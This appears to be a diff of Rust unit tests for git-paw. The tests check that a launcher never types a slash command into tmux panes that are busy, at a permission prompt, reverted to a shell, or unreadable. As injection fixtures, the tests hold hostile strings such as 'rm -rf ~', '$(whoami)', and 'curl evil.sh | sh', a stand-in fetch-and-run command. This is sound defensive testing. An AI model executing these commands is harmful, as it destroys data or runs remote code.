+        fn new(scripts: &[(usize, &[&str])]) -> Self {
+            Self {
+                scripts: scripts
+                    .iter()
+                    .map(|(pane, script)| {
+                        (*pane, script.iter().map(|s| (*s).to_string()).collect())
+                    })
+                    .collect(),
+                taken: std::collections::HashMap::new(),
+                commands: std::collections::HashMap::new(),
+                sent: Vec::new(),
+                elapsed: 0,
+            }
+        }
+
+        /// Makes `pane`'s foreground process `command` (e.g. a shell name).
+        fn with_command(mut self, pane: usize, command: &str) -> Self {
+            self.commands.insert(pane, command.to_string());
+            self
+        }
+    }
+
+    impl EntryPointIo for FakeEntryPointIo {
+        fn capture(&mut self, _session: &str, pane_index: usize) -> Option<String> {
+            let script = self.scripts.get(&pane_index).cloned().unwrap_or_default();
+            let cursor = self.taken.entry(pane_index).or_insert(0);
+            let idx = (*cursor).min(script.len().saturating_sub(1));
+            *cursor += 1;
+            let frame = script.get(idx).cloned().unwrap_or_default();
+            (frame != CAPTURE_FAILED).then_some(frame)
+        }
+
+        fn pane_command(&mut self, _session: &str, pane_index: usize) -> Option<String> {
+            let command = self
+                .commands
+                .get(&pane_index)
+                .cloned()
+                .unwrap_or_else(|| "paw-test-cli".to_string());
+            (command != CAPTURE_FAILED).then_some(command)
+        }
+
+        fn send_text(&mut self, _session: &str, pane_index: usize, text: &str) {
+            self.sent.push((pane_index, format!("text:{text}")));
+        }
+
+        fn send_key(&mut self, _session: &str, pane_index: usize, key: &str) {
+            self.sent.push((pane_index, format!("key:{key}")));
+        }
+
+        fn sleep(&mut self, ms: u64) {
+            self.elapsed += ms;
+        }
+
+        fn elapsed_ms(&self) -> u64 {
+            self.elapsed
+        }
+    }
+
+    fn pending(pane_index: usize) -> PendingEntryPoint {
+        PendingEntryPoint {
+            pane_index,
+            agent_id: "feat-x".to_string(),
+            entry_point: "/opsx:apply my-change".to_string(),
+            settle_delay_ms: 100,
+        }
+    }
+
+    /// An idle pane with an empty composer. Two consecutive idle captures and
+    /// a third confirming one immediately before the keystroke.
+    const IDLE: &str = "● Ran tool\n  ? for shortcuts";
+    /// The mid-response footer of the embedded prompt profile.
+    const MID_RESPONSE: &str = "● Thinking…\n  esc to interrupt";
+    /// A live permission prompt.
+    const LIVE_PROMPT: &str =
+        "Bash command\n  rm -rf /\nDo you want to proceed?\n❯ 1. Yes\n  2. No\n(esc to cancel)";
+    /// An idle pane whose composer already holds somebody else's text.
+    const BUFFERED: &str =
+        "● Ran tool\n────────────────\n❯ please continue\n────────────────\n  ? for shortcuts";
+
+    /// Maps to scenario "The `OpenSpec` entry point is submitted after the
+    /// first message": an idle pane gets the line typed literally and its own
+    /// separate `Enter`.
+    #[test]
+    fn an_idle_pane_receives_the_entry_point_and_its_own_enter() {
+        let mut io = FakeEntryPointIo::new(&[(1, &[IDLE])]);
+        let expired = submit_entry_points_with(&mut io, "paw-x", vec![pending(1)], 60_000);
+        assert!(expired.is_empty(), "the pane was idle, so nothing expired");
+        assert_eq!(
+            io.sent,
+            vec![
+                (1, "text:/opsx:apply my-change".to_string()),
+                (1, "key:Enter".to_string()),
+            ]
+        );
+    }
+
+    /// Maps to scenario "A busy pane is not typed into": the mid-response
+    /// marker keeps the streak at zero, so the budget expires untouched.
+    #[test]
+    fn a_pane_mid_response_is_never_typed_into() {
+        let mut io = FakeEntryPointIo::new(&[(1, &[MID_RESPONSE])]);
+        let expired = submit_entry_points_with(&mut io, "paw-x", vec![pending(1)], 1_000);
+        assert_eq!(expired.len(), 1, "the pane never went idle");
+        assert!(io.sent.is_empty(), "no keystroke may reach a busy pane");
+    }
+
+    /// Maps to scenario "A pane at a permission prompt gets nothing typed" —
+    /// both halves: nothing is typed, AND stderr names the pane and the exact
+    /// command so a human or an orchestrator can finish the job.
+    #[test]
+    fn a_pane_at_a_permission_prompt_is_never_typed_into() {
+        let mut io = FakeEntryPointIo::new(&[(1, &[LIVE_PROMPT])]);
+        let expired = submit_entry_points_with(&mut io, "paw-x", vec![pending(1)], 1_000);
+        assert_eq!(expired.len(), 1);
+        assert!(
+            io.sent.is_empty(),
+            "a keystroke here would ANSWER the prompt"
+        );
+
+        let notice = entry_point_expiry_notice(&expired[0], 1_000);
+        assert!(notice.contains("pane 1"), "names the pane; got: {notice}");
+        assert!(notice.contains("feat-x"), "names the agent; got: {notice}");
+        assert!(
+            notice.contains("/opsx:apply my-change"),
+            "names the EXACT command to submit, not a paraphrase; got: {notice}"
+        );
+    }
+
+    /// The expiry notice reports the budget in whole seconds, matching what
+    /// the user-guide documents.
+    #[test]
+    fn the_expiry_notice_reports_the_budget_in_seconds() {
+        let notice = entry_point_expiry_notice(
+            &EntryPointReport {
+                pane: pending(2),
+                failure: EntryPointFailure::Expired,
+            },
+            ENTRY_POINT_BUDGET_MS,
+        );
+        assert!(
+            notice.contains("within 120s"),
+            "the default budget is 120s; got: {notice}"
+        );
+    }
+
+    /// A composer already holding text is not appended to: the result would
+    /// be a line neither party wrote.
+    #[test]
+    fn a_pane_with_a_non_empty_composer_is_never_typed_into() {
+        let mut io = FakeEntryPointIo::new(&[(1, &[BUFFERED])]);
+        let expired = submit_entry_points_with(&mut io, "paw-x", vec![pending(1)], 1_000);
+        assert_eq!(expired.len(), 1);
+        assert!(io.sent.is_empty());
+    }
+
+    /// A single idle capture is not enough — the instant between the
+    /// prompt's `Enter` and the CLI starting its turn reads as idle.
+    #[test]
+    fn one_idle_capture_is_not_enough_to_type() {
+        let mut io = FakeEntryPointIo::new(&[(1, &[IDLE, MID_RESPONSE])]);
+        let expired = submit_entry_points_with(&mut io, "paw-x", vec![pending(1)], 1_000);
+        assert_eq!(expired.len(), 1, "the streak was broken before the second");
+        assert!(io.sent.is_empty());
+    }
+
+    /// The TOCTOU re-check: two idle captures, then a permission prompt on
+    /// the capture taken immediately before typing. Nothing is sent.
+    #[test]
+    fn a_prompt_raised_between_the_check_and_the_keystroke_cancels_it() {
+        let mut io = FakeEntryPointIo::new(&[(1, &[IDLE, IDLE, LIVE_PROMPT])]);
+        let expired = submit_entry_points_with(&mut io, "paw-x", vec![pending(1)], 1_000);
+        assert_eq!(expired.len(), 1);
+        assert!(
+            io.sent.is_empty(),
+            "the re-capture before typing must veto the keystroke"
+        );
+    }
+
+    /// An unrecognised CLI matches no marker, so it reads as idle and its
+    /// entry point follows the first message — what the CLI's own input
+    /// queue would see from a human typing twice.
+    #[test]
+    fn an_unrecognised_cli_is_treated_as_idle() {
+        let mut io = FakeEntryPointIo::new(&[(1, &["some other CLI's chrome, no known markers"])]);
+        let expired = submit_entry_points_with(&mut io, "paw-x", vec![pending(1)], 60_000);
+        assert!(expired.is_empty());
+        assert_eq!(io.sent.len(), 2);
+    }
+
+    /// Maps to decision D3: the panes are waited for concurrently, so a pane
+    /// that goes idle early is submitted while a slower sibling is still
+    /// working — and the slow one's expiry does not hold up the fast one.
+    #[test]
+    fn panes_are_waited_for_concurrently_not_one_after_another() {
+        let mut io = FakeEntryPointIo::new(&[(1, &[IDLE]), (2, &[MID_RESPONSE])]);
+        let expired =
+            submit_entry_points_with(&mut io, "paw-x", vec![pending(1), pending(2)], 1_000);
+        assert_eq!(
+            expired
+                .iter()
+                .map(|r| r.pane.pane_index)
+                .collect::<Vec<_>>(),
+            vec![2]
+        );
+        assert!(io.sent.iter().all(|(pane, _)| *pane == 1));
+        assert_eq!(io.sent.len(), 2);
+    }
+
+    /// Maps to scenario "A pane whose CLI has exited is not typed into".
+    ///
+    /// A pane that reverted to a shell (GP-03c) looks idle to every
+    /// capture-based predicate — no input box, no prompt, no mid-response
+    /// marker, because none of those are a shell's. Without the pane-command
+    /// check the rendered command would be handed to a command interpreter.
+    #[test]
+    fn a_pane_that_reverted_to_a_shell_is_never_typed_into() {
+        for shell in ["bash", "zsh", "sh", "fish"] {
+            let mut io = FakeEntryPointIo::new(&[(1, &[IDLE])]).with_command(1, shell);
+            let reports = submit_entry_points_with(&mut io, "paw-x", vec![pending(1)], 60_000);
+            assert!(
+                io.sent.is_empty(),
+                "{shell} is a command interpreter, not a composer; sent: {:?}",
+                io.sent
+            );
+            assert_eq!(
+                reports[0].failure,
+                EntryPointFailure::ShellPane(shell.to_string())
+            );
+            let notice = entry_point_expiry_notice(&reports[0], 60_000);
+            assert!(notice.contains(shell), "names the shell; got: {notice}");
+            assert!(
+                notice.contains("/opsx:apply my-change"),
+                "still names the command; got: {notice}"
+            );
+        }
+    }
+
+    /// Maps to scenario "An unsafe rendered entry point is refused".
+    ///
+    /// The spec id is a change-directory name that nothing validates, and a
+    /// directory may legally carry shell metacharacters. Paired with a pane
+    /// that has reverted to a shell, the rendered text would be executed —
+    /// so it is refused before any pane is even polled.
+    #[test]
+    fn an_entry_point_with_shell_metacharacters_is_refused_outright() {
+        for hostile in [
+            "/opsx:apply x; rm -rf ~",
+            "/opsx:apply $(whoami)",
+            "/opsx:apply `id`",
+            "/opsx:apply x && curl evil.sh | sh",
+            "/opsx:apply x\nrm -rf /",
+            "/opsx:apply x > ~/.zshrc",
+        ] {
+            let mut pane = pending(1);
+            pane.entry_point = hostile.to_string();
+            let mut io = FakeEntryPointIo::new(&[(1, &[IDLE])]);
+            let reports = submit_entry_points_with(&mut io, "paw-x", vec![pane], 60_000);
+            assert!(
+                io.sent.is_empty(),
+                "{hostile:?} must never be typed; sent: {:?}",
+                io.sent
+            );
+            assert_eq!(reports[0].failure, EntryPointFailure::UnsafeText);
+            assert_eq!(io.elapsed_ms(), 0, "and it must not even be waited for");
+        }
+    }
+
+    /// The safe set still admits what a real workflow command needs.
+    #[test]
+    fn ordinary_workflow_commands_pass_the_character_check() {
+        for ok in [
+            "/opsx:apply my-change",
+            "/opsx:apply feature_123",
+            "/opsx:apply 003-user-list.v2",
+            "/speckit.implement T009",
+        ] {
+            assert!(entry_point_text_is_safe(ok), "{ok:?} must be allowed");
+        }
+        assert!(!entry_point_text_is_safe(""), "empty is not a command");
+    }
+
+    /// Maps to scenario "A prompt raised during the settle delay withholds
+    /// the Enter".
+    ///
+    /// The split-send leaves a window between the typed text and its `Enter`
+    /// — exactly the window a fork or a tool call raises a permission prompt
+    /// in. An `Enter` arriving then ANSWERS that prompt. The captures here
+    /// read idle, idle, idle (the pre-typing re-check), then a live prompt.
+    #[test]
+    fn a_prompt_raised_during_the_settle_delay_withholds_the_enter() {
+        let mut io = FakeEntryPointIo::new(&[(1, &[IDLE, IDLE, IDLE, LIVE_PROMPT])]);
+        let reports = submit_entry_points_with(&mut io, "paw-x", vec![pending(1)], 60_000);
+        assert_eq!(
+            io.sent,
+            vec![(1, "text:/opsx:apply my-change".to_string())],
+            "the text went out, but the Enter must be withheld"
+        );
+        assert_eq!(reports[0].failure, EntryPointFailure::TypedNotSubmitted);
+
+        let notice = entry_point_expiry_notice(&reports[0], 60_000);
+        assert!(
+            notice.contains("do NOT retype it"),
+            "the remedy must not double the text already in the composer; got: {notice}"
+        );
+        assert!(notice.contains("/opsx:apply my-change"), "got: {notice}");
+    }
+
+    /// Maps to scenario "A failed capture is not read as idle".
+    ///
+    /// `tmux capture-pane` failing yields an empty string, and an empty
+    /// capture satisfies every idle marker there is — no prompt, no footer,
+    /// no input box. "I could not look" must reset the streak, not complete
+    /// it.
+    #[test]
+    fn a_failed_capture_is_not_evidence_of_idleness() {
+        let mut io = FakeEntryPointIo::new(&[(1, &[CAPTURE_FAILED])]);
+        let reports = submit_entry_points_with(&mut io, "paw-x", vec![pending(1)], 1_000);
+        assert!(io.sent.is_empty(), "a blind pane must not be typed into");
+        assert_eq!(reports[0].failure, EntryPointFailure::Expired);
+    }
+
+    /// And a failed capture mid-streak resets it rather than counting.
+    ///
+    /// The sequence is chosen so the test DISCRIMINATES: treat the failed
+    /// capture as idle and the streak reaches two, the re-check sees the
+    /// third frame (idle) and the text goes out. Only the reset keeps this
+    /// pane untouched. Reverting the reset must turn this red.
+    #[test]
+    fn a_failed_capture_resets_the_idle_streak() {
+        let mut io = FakeEntryPointIo::new(&[(1, &[IDLE, CAPTURE_FAILED, IDLE, MID_RESPONSE])]);
+        let reports = submit_entry_points_with(&mut io, "paw-x", vec![pending(1)], 1_000);
+        assert!(
+            io.sent.is_empty(),
+            "a capture that failed must not complete the streak; sent: {:?}",
+            io.sent
+        );
+        assert_eq!(reports[0].failure, EntryPointFailure::Expired);
+    }
+
+    /// A pane whose foreground process cannot be read is not typed into.
+    ///
+    /// `display-message` fails when the pane has vanished or been respawned
+    /// since the idle re-check — exactly the window in which it might now be
+    /// a shell. Reading nothing is not permission to type.
+    #[test]
+    fn a_pane_whose_process_cannot_be_read_is_not_typed_into() {
+        let mut io = FakeEntryPointIo::new(&[(1, &[IDLE])]).with_command(1, CAPTURE_FAILED);
+        let reports = submit_entry_points_with(&mut io, "paw-x", vec![pending(1)], 1_000);
+        assert!(
+            io.sent.is_empty(),
+            "a pane whose process could not be read must receive nothing; sent: {:?}",
+            io.sent
+        );
+        assert_eq!(reports[0].failure, EntryPointFailure::Expired);
+    }
+
+    /// The rejected text is Debug-escaped on stderr: it comes from a
+    /// directory name nothing validates, and a raw print would let control
+    /// or ANSI sequences in that name drive the operator's terminal.
+    #[test]
+    fn the_unsafe_text_notice_escapes_what_it_reports() {
+        let mut pane = pending(1);
+        pane.entry_point = "/opsx:apply \u{1b}[2Jx\nrm -rf ~".to_string();
+        let notice = entry_point_expiry_notice(
+            &EntryPointReport {
+                pane,
+                failure: EntryPointFailure::UnsafeText,
+            },
+            1_000,
+        );
+        assert!(
+            !notice.contains('\u{1b}') && !notice.contains('\n'),
+            "no raw escape or newline may reach the terminal; got: {notice}"
+        );
+        assert!(
+            notice.contains("\\u{1b}") && notice.contains("\\n"),
+            "the text is still reported, escaped; got: {notice}"
+        );
+    }
+
+    /// Nothing is waited for when no pane declares an entry point — a launch
+    /// of Markdown/Spec Kit/Superpowers specs costs no extra wall clock.
+    #[test]
+    fn no_declared_entry_points_means_no_wait_at_all() {
+        let mut io = FakeEntryPointIo::new(&[]);
+        let expired = submit_entry_points_with(&mut io, "paw-x", Vec::new(), 60_000);
+        assert!(expired.is_empty());
+        assert_eq!(io.elapsed_ms(), 0, "the loop must not even sleep once");
     }
 
     // -----------------------------------------------------------------------
@@ -2161,7 +3108,7 @@ mod tests {
     #[test]
     fn task_prompt_with_spec_points_at_sidecar_and_includes_id() {
         let entry = make_spec_entry("my-change", "## 1. First section\n\nbody body body");
-        let prompt = build_task_prompt(Some(&entry));
+        let prompt = build_task_prompt(Some(&entry)).prose;
         assert!(
             prompt.contains(git_paw::agents::SIDECAR_REL_PATH),
             "spec-derived task prompt should point at the sidecar, got: {prompt}"
@@ -2174,7 +3121,7 @@ mod tests {
 
     #[test]
     fn task_prompt_without_spec_points_at_sidecar() {
-        let prompt = build_task_prompt(None);
+        let prompt = build_task_prompt(None).prose;
         assert_eq!(
             prompt,
             "Read .git-paw/AGENTS.local.md first for your assignment, then begin your assigned task.",
@@ -2182,15 +3129,18 @@ mod tests {
         );
     }
 
+    /// Maps to `supervisor-launch` scenario "`OpenSpec` task prompt declares
+    /// opsx:apply as its entry point".
+    ///
+    /// OVERRIDE (launch-prompt-entry-point): this test previously required
+    /// the prose to CONTAIN `/opsx:apply <id>`. A Haiku worker narrated that
+    /// embedded command instead of running it (GP-54), so the command moved
+    /// out of the prose entirely and became the declared entry point the
+    /// launch submits as its own composer line. The prose must now be free of
+    /// it — a command still in the sentence is a command that can be
+    /// described rather than invoked.
     #[test]
-    fn task_prompt_openspec_backend_points_at_sidecar_then_invokes_opsx_apply() {
-        // OVERRIDE (agents-md-sidecar-injection): pre-sidecar this branch was
-        // the bare `/opsx:apply <id>` with deliberately NO pointer, because the
-        // combined view was auto-loaded from the worktree-root AGENTS.md. The
-        // managed block now lives in a gitignored sidecar the CLIs do not
-        // auto-load, so the prompt MUST point the agent at the sidecar first,
-        // then run the slash command. This intentionally reverses the earlier
-        // "no AGENTS.md pointer" decision.
+    fn task_prompt_openspec_backend_declares_opsx_apply_outside_the_prose() {
         let entry = git_paw::specs::SpecEntry {
             id: "my-change".to_string(),
             backend: git_paw::specs::SpecBackendKind::OpenSpec,
@@ -2199,18 +3149,24 @@ mod tests {
             prompt: String::new(),
             owned_files: None,
         };
-        let prompt = build_task_prompt(Some(&entry));
+        let task_prompt = build_task_prompt(Some(&entry));
+        let prose = &task_prompt.prose;
         assert!(
-            prompt.contains(git_paw::agents::SIDECAR_REL_PATH),
-            "OpenSpec branch must point the agent at the sidecar, got: {prompt}"
+            prose.contains(git_paw::agents::SIDECAR_REL_PATH),
+            "OpenSpec branch must point the agent at the sidecar, got: {prose}"
         );
         assert!(
-            prompt.contains("/opsx:apply my-change"),
-            "OpenSpec branch must still invoke the opsx:apply slash command, got: {prompt}"
+            !prose.contains("/opsx:apply"),
+            "the command must not be embedded in the prose, got: {prose}"
         );
         assert!(
-            !prompt.contains("openspec/changes/"),
-            "OpenSpec branch must suppress the openspec/changes/ path prose, got: {prompt}"
+            !prose.contains("openspec/changes/"),
+            "OpenSpec branch must suppress the openspec/changes/ path prose, got: {prose}"
+        );
+        assert_eq!(
+            task_prompt.entry_point.as_deref(),
+            Some("/opsx:apply my-change"),
+            "the command is declared as the entry point instead"
         );
     }
 
@@ -2224,7 +3180,8 @@ mod tests {
             prompt: String::new(),
             owned_files: None,
         };
-        let prompt = build_task_prompt(Some(&entry));
+        let task_prompt = build_task_prompt(Some(&entry));
+        let prompt = &task_prompt.prose;
         assert!(
             prompt.contains(git_paw::agents::SIDECAR_REL_PATH),
             "Markdown-backed task prompt should point at the sidecar, got: {prompt}"
@@ -2237,18 +3194,23 @@ mod tests {
             !prompt.contains("/opsx:apply"),
             "Markdown branch must NOT invoke the OpenSpec slash command, got: {prompt}"
         );
+        assert_eq!(
+            task_prompt.entry_point, None,
+            "Markdown has no apply workflow to enter"
+        );
     }
 
     #[test]
     fn task_prompt_without_spec_points_at_sidecar_verbatim() {
         // Regression: the `None` branch must produce the exact sidecar-pointer
         // fallback string byte-for-byte, even after the per-backend dispatch.
-        let prompt = build_task_prompt(None);
+        let task_prompt = build_task_prompt(None);
         assert_eq!(
-            prompt,
+            task_prompt.prose,
             "Read .git-paw/AGENTS.local.md first for your assignment, then begin your assigned task.",
             "no-spec task prompt should be the sidecar-pointer fallback verbatim"
         );
+        assert_eq!(task_prompt.entry_point, None);
     }
 
     #[test]
@@ -2261,7 +3223,7 @@ mod tests {
             "prompt-submit-fix",
             "## 1. Code fix in cmd_supervisor\n\n- [ ] 1.1 Add a constant.\n",
         );
-        let prompt = build_task_prompt(Some(&entry));
+        let prompt = build_task_prompt(Some(&entry)).prose;
         assert!(
             !prompt.contains("## 1. Code fix in cmd_supervisor"),
             "task prompt MUST NOT include the spec body's first heading in raw form, got: {prompt}"
@@ -2280,12 +3242,9 @@ mod tests {
     fn every_build_task_prompt_arm_points_at_the_sidecar() {
         use git_paw::agents::SIDECAR_REL_PATH;
         use git_paw::specs::{SpecBackendKind, SpecEntry};
-        for backend in [
-            SpecBackendKind::OpenSpec,
-            SpecBackendKind::Markdown,
-            SpecBackendKind::SpecKit,
-            SpecBackendKind::Superpowers,
-        ] {
+        // Driven off `SpecBackendKind::ALL`, not a hand-written list: a new
+        // variant must be covered here, not silently skipped.
+        for backend in SpecBackendKind::ALL {
             let entry = SpecEntry {
                 id: "x".to_string(),
                 backend,
@@ -2294,14 +3253,14 @@ mod tests {
                 prompt: String::new(),
                 owned_files: None,
             };
-            let prompt = build_task_prompt(Some(&entry));
+            let prompt = build_task_prompt(Some(&entry)).prose;
             assert!(
                 prompt.contains(SIDECAR_REL_PATH),
                 "spec-backed arm must point at the sidecar, got: {prompt}"
             );
         }
         assert!(
-            build_task_prompt(None).contains(SIDECAR_REL_PATH),
+            build_task_prompt(None).prose.contains(SIDECAR_REL_PATH),
             "no-spec arm must point at the sidecar"
         );
     }
@@ -2312,7 +3271,7 @@ mod tests {
     #[test]
     fn build_task_prompt_spec_entry_contains_sidecar_and_spec_id() {
         let entry = make_spec_entry("governance-config", "## 1. Struct definitions\n\nBody.");
-        let prompt = build_task_prompt(Some(&entry));
+        let prompt = build_task_prompt(Some(&entry)).prose;
         assert!(
             prompt.contains(git_paw::agents::SIDECAR_REL_PATH),
             "spec-derived prompt should point at the sidecar, got: {prompt}"
@@ -2342,7 +3301,7 @@ mod tests {
             prompt: String::new(),
             owned_files: None,
         };
-        let prompt = build_task_prompt(Some(&entry));
+        let prompt = build_task_prompt(Some(&entry)).prose;
         assert!(
             prompt.contains(git_paw::agents::SIDECAR_REL_PATH),
             "Spec Kit task prompt should still point at the sidecar, got: {prompt}"
@@ -2435,7 +3394,7 @@ mod tests {
         let entry = make_spec_entry("governance-config", "## body\n\nmore body");
         let a = build_task_prompt(Some(&entry));
         let b = build_task_prompt(Some(&entry));
-        assert_eq!(a.as_bytes(), b.as_bytes(), "must be deterministic");
+        assert_eq!(a, b, "must be deterministic");
 
         let src = include_str!("main.rs");
         let needle = "pub(crate) fn build_task_prompt";
@@ -2465,6 +3424,10 @@ mod tests {
         assert!(end > body_start, "did not find closing brace");
         let body = &src[body_start..end];
 
+        // The selector `build_task_prompt` delegates to now holds the match,
+        // so its source is part of this function's effective body — checking
+        // only the three lines here would guard nothing.
+        let selector = include_str!("task_prompts.rs");
         for needle in [
             "std::fs::",
             "File::open",
@@ -2476,6 +3439,64 @@ mod tests {
                 !body.contains(needle),
                 "build_task_prompt body must not contain `{needle}`; body:\n{body}"
             );
+            assert!(
+                !selector.contains(needle),
+                "the task-prompt selector it delegates to must not contain `{needle}` either"
+            );
+        }
+    }
+
+    /// Standing guard for `boot-block` scenario "Every launch path carries
+    /// the rule". The rule is appended in exactly one place
+    /// ([`compose_launch_prompt`]), so the way a path can lose it is to build
+    /// its prompt some other way. This pins the funnel: no launch path may
+    /// reach [`submit_prompt_to_pane`] or `build_boot_inject_args` with a
+    /// string it composed itself.
+    ///
+    /// A source check rather than five more tmux end-to-end tests: the claim
+    /// is about which code path builds the prompt, and a grep answers that
+    /// for every path at once — including ones a future change adds.
+    #[test]
+    fn every_injecting_path_composes_its_prompt_through_one_helper() {
+        for (name, src) in [
+            ("main.rs", include_str!("main.rs")),
+            ("commands/start.rs", include_str!("commands/start.rs")),
+            (
+                "commands/supervisor.rs",
+                include_str!("commands/supervisor.rs"),
+            ),
+            ("commands/add.rs", include_str!("commands/add.rs")),
+        ] {
+            // The pre-change composition helper must be gone everywhere: it
+            // joined boot block and prose with no worktree rule. Spelled in
+            // two halves so this file's own source does not match the needle
+            // it searches for.
+            let retired = concat!("combine_boot_and", "_task_prompt");
+            assert!(
+                !src.contains(retired),
+                "{name} still composes a prompt with `{retired}`, which carries \
+                 no worktree rule"
+            );
+            // Any file that injects must also compose.
+            let injects =
+                src.contains("submit_prompt_to_pane(") || src.contains("build_boot_inject_args(");
+            if injects {
+                // Either it composes directly, or it takes a prompt from
+                // `attach_agent`, which composes via `compose_agent_launch`.
+                let composes = [
+                    "compose_launch_prompt(",
+                    "compose_agent_launch(",
+                    "attach_agent(",
+                ]
+                .iter()
+                .any(|needle| src.contains(needle));
+                assert!(
+                    composes,
+                    "{name} injects a prompt but never composes one — every injecting \
+                     path must go through compose_launch_prompt so it carries the \
+                     worktree rule"
+                );
+            }
         }
     }
 
@@ -2719,6 +3740,7 @@ mod tests {
                 branch_created: wt.branch_created,
                 base_branch: created_branch_base(&repo, wt.branch_created),
                 pending_boot_prompt: None,
+                pending_entry_point: None,
                 runtime_slot: None,
                 cli_session_id: None,
                 spec_id: None,
@@ -2801,6 +3823,7 @@ mod tests {
                 branch_created: wt.branch_created,
                 base_branch: created_branch_base(&repo, wt.branch_created),
                 pending_boot_prompt: None,
+                pending_entry_point: None,
                 runtime_slot: None,
                 cli_session_id: None,
                 spec_id: None,
